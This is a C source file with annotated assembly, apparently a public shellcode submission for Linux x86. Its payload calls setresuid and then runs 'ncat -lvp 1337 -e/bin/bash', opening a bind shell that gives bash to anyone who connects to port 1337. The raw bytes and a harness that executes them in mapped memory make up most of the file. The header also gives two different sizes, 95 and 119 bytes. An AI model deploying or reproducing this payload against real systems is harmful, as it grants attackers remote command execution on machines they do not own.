/*
   Linux/x86-execve(/usr/bin/ncat -lvp 1337 -e/bin/bash)+NULL-FREE Shellcode(95 bytes)
   Author : T3jv1l
   Contact: t3jv1l@gmail.com
   Twitter:https://twitter.com/T3jv1l
   Shellcode len : 119 bytes
   Compilation: gcc  shellcode.c -o shellcode
   Compilation for x64 : gcc -m32 shellcode.c -o shellcode
   Tested On: Ubuntu 16.04.5 LTS
   Arch: x86
   Size: 95 bytes
   Thanks for helping NytroRST


############################################################################
global _start:
_start:
jmp short todo


shellcode:

xor eax, eax            ;Zero out eax
xor ebx, ebx            ;Zero out ebx
xor ecx, ecx            ;Zero out ecx
cdq	      		;Zero out edx using the sign bit from eax
mov BYTE al, 0xa4       ;Setresuid syscall 164 (0xa4)
int 0x80                ;Syscall execute
pop esi                 ;Esi contain the string in db
xor eax, eax            ;Zero out eax
mov[esi+13], al         ;Null terminate /usr/bin/ncat
mov[esi+22], al         ;Null terminate -lvp1337
mov[esi+34], al         ;Null terminate -e/bin/bash
mov[esi+35], esi        ;Store address of /usr/bin/ncat in AAAA
lea ebx, [esi+14]       ;Load address of -lvp1337
mov[esi+39], ebx        ;Store address of -lvp1337 in BBBB taken from ebx
lea ebx, [esi+23]       ;Load address of -e/bin/bash into ebx
mov[esi+43], ebx        ;Store address of -e/bin/bash in CCCC taken from ebx
mov[esi+47], eax        ;Zero out DDDD
mov al, 11              ;11 is execve syscall number
mov ebx, esi            ;Store address of /usr/bin/ncat
lea ecx, [esi+35]       ;Load address of ptr to argv[] array
lea edx, [esi+47]       ;envp[] NULL
int 0x80                ;Syscall execute

todo:
call shellcode
db '/usr/bin/ncat#-lvp1337#-e/bin/bash#AAAABBBBCCCCDDDD'
;   012345678901234567890123456789012345678901234567890

######################################################################################

ncat.o:     file format elf32-i386


Disassembly of section .text:

00000000 <_start>:
   0:	eb 35                	jmp    37 <todo>

00000002 <shellcode>:
   2:	31 c0                	xor    %eax,%eax
   4:	31 db                	xor    %ebx,%ebx
   6:	31 c9                	xor    %ecx,%ecx
   8:	99                   	cltd
   9:	b0 a4                	mov    $0xa4,%al
   b:	cd 80                	int    $0x80
   d:	5e                   	pop    %esi
   e:	31 c0                	xor    %eax,%eax
  10:	88 46 0d             	mov    %al,0xd(%esi)
  13:	88 46 16             	mov    %al,0x16(%esi)
  16:	88 46 22             	mov    %al,0x22(%esi)
  19:	89 76 23             	mov    %esi,0x23(%esi)
  1c:	8d 5e 0e             	lea    0xe(%esi),%ebx
  1f:	89 5e 27             	mov    %ebx,0x27(%esi)
  22:	8d 5e 17             	lea    0x17(%esi),%ebx
  25:	89 5e 2b             	mov    %ebx,0x2b(%esi)
  28:	89 46 2f             	mov    %eax,0x2f(%esi)
  2b:	b0 0b                	mov    $0xb,%al
  2d:	89 f3                	mov    %esi,%ebx
  2f:	8d 4e 23             	lea    0x23(%esi),%ecx
  32:	8d 56 2f             	lea    0x2f(%esi),%edx
  35:	cd 80                	int    $0x80

00000037 <todo>:
  37:	e8 c6 ff ff ff       	call   2 <shellcode>
  3c:	2f                   	das
  3d:	75 73                	jne    b2 <todo+0x7b>
  3f:	72 2f                	jb     70 <todo+0x39>
  41:	62 69 6e             	bound  %ebp,0x6e(%ecx)
  44:	2f                   	das
  45:	6e                   	outsb  %ds:(%esi),(%dx)
  46:	63 61 74             	arpl   %sp,0x74(%ecx)
  49:	23 2d 6c 76 70 31    	and    0x3170766c,%ebp
  4f:	33 33                	xor    (%ebx),%esi
  51:	37                   	aaa
  52:	23 2d 65 2f 62 69    	and    0x69622f65,%ebp
  58:	6e                   	outsb  %ds:(%esi),(%dx)
  59:	2f                   	das
  5a:	62 61 73             	bound  %esp,0x73(%ecx)
  5d:	68 23 41 41 41       	push   $0x41414123
  62:	41                   	inc    %ecx
  63:	42                   	inc    %edx
  64:	42                   	inc    %edx
  65:	42                   	inc    %edx
  66:	42                   	inc    %edx
  67:	43                   	inc    %ebx
  68:	43                   	inc    %ebx
  69:	43                   	inc    %ebx
  6a:	43                   	inc    %ebx
  6b:	44                   	inc    %esp
  6c:	44                   	inc    %esp
  6d:	44                   	inc    %esp
  6e:	44                   	inc    %esp
###################################################################################
*/

#include <stdio.h>
#include <sys/mman.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>

int (*shellcodetotest)();

char shellcode[] = "\xeb\x35\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x5e\x31\xc0\x88\x46\x0d\x88\x46\x16\x88\x46\x22\x89\x76\x23\x8d\x5e\x0e\x89\x5e\x27\x8d\x5e\x17\x89\x5e\x2b\x89\x46\x2f\xb0\x0b\x89\xf3\x8d\x4e\x23\x8d\x56\x2f\xcd\x80\xe8\xc6\xff\xff\xff\x2f\x75\x73\x72\x2f\x62\x69\x6e\x2f\x6e\x63\x61\x74\x23\x2d\x6c\x76\x70\x31\x33\x33\x37\x23\x2d\x65\x2f\x62\x69\x6e\x2f\x62\x61\x73\x68\x23";



int main(int argc, char **argv) {
	void *ptr = mmap(0, 150, PROT_EXEC | PROT_WRITE| PROT_READ, MAP_ANON | MAP_PRIVATE, -1, 0);
	if(ptr == MAP_FAILED){
		perror("mmap");
		exit(-1);
printf("Shellcode Length:  %d\n", strlen(shellcode));
	}


	memcpy(ptr, shellcode, sizeof(shellcode));
	shellcodetotest = ptr;
	shellcodetotest();
	return 0;


}